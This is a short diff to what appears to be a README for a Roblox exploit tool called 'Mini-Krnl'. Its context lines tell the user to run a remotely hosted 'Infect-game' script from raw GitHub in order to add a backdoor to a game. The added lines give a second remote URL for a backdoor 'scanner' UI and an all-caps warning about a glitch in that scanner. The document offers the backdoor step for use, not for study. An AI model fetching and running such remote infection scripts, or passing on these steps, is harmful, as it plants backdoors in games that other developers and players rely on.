@@ -10,4 +10,8 @@ to add the backdoor run
 https://raw.githubusercontent.com/BabushkaBoosters/Mini-Krnl/refs/heads/main/Infect-game
 
 and loading the scanner run
+https://raw.githubusercontent.com/BabushkaBoosters/Mini-Krnl/refs/heads/main/UI
 
+<h1>JUST A WARNING</h1>
+THE SCANNER HAS A GLITCH WHERE WHEN YOU INJECT IT AND THERE IS A BACKDOOR IT SAYS BACKDOOR NOT FOUND BUT THEN BACKDOOR FOUND
+just saying
